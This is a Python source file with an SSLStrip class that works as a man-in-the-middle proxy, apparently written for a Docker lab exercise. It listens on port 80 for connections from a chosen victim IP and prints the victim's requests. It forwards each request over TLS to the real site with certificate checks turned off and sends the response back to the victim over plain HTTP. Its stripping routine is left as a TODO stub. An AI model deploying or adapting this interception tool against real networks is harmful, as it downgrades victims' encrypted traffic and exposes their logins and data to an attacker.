import scapy.all as scapy
import socket
import ssl
import logging
import threading
import time
import os

class SSLStrip:
    def __init__(self, iface, victimIP, websiteIP):
        self.iface = iface
        self.victimIP = victimIP
        self.websiteIP = websiteIP
        self.fakeIP = scapy.get_if_addr(iface)

    def get_data(self, socket):
        data = b''

        while True:
            chunk = socket.recv(4096)

            if not chunk:
                break

            data += chunk

            if len(chunk) < 4096:
                break

        return data

    def get_host(self, request):
        try:
            data = request.decode('utf-8', 'ignore')
            headers = data.split('\r\n')[1:]

            for header in headers:
                if header.lower().startswith('host:'):
                    return header.split(':', 1)[1].strip()
        except:
            return None

    # Strip server response of anything that could revert it to HTTPS
    def strip(self, response):
        # TODO
        return response

    def start(self, stop_event):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind(('0.0.0.0', 80))
        server.listen()
        server.settimeout(1)

        threads = []

        while not stop_event.is_set():
            try:
                client, address = server.accept()

                if address[0] != self.victimIP:
                    client.close()
                    continue

                print("[SSLStrip]: Victim opened a connection")

                thread = threading.Thread(
                    target=self.handle,
                    args=(client,)
                )

                threads.append(thread)
                thread.start()
            except socket.timeout:
                continue

        server.close()

        for thread in threads:
            thread.join()

    def handle(self, client):
        try:
            request = self.get_data(client)

            if not request:
                print("[SSLStrip]: No request data, closing the connection")
                client.close()
                return

            print("[SSLStrip]: Received the request")
            print(request.decode('utf-8', 'ignore'))

            # XXX: Purely for Docker multi-container log to be more readable
            time.sleep(0.1)

            host = self.get_host(request)

            if host is None:
                print("[SSLStrip]: No host header, closing the connection")
                client.close()
                return

            print("[SSLStrip]: Opening a secure connection with the website")

            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.connect((self.websiteIP, 443))

            ssl_context = ssl.create_default_context()
            ssl_context.check_hostname = False
            ssl_context.verify_mode = ssl.CERT_NONE

            ssl_server = ssl_context.wrap_socket(server, server_hostname=host)

            print("[SSLStrip]: Forwarding the request to the website")
            ssl_server.sendall(request)

            response = self.get_data(ssl_server)
            response = self.strip(response)

            ssl_server.close()

            print("[SSLStrip]: Forwarding the response to the victim")
            client.sendall(response)
        except Exception as e:
            print(f"[SSLStrip]: Failed to handle the connection: {e}")
        finally:
            client.close()
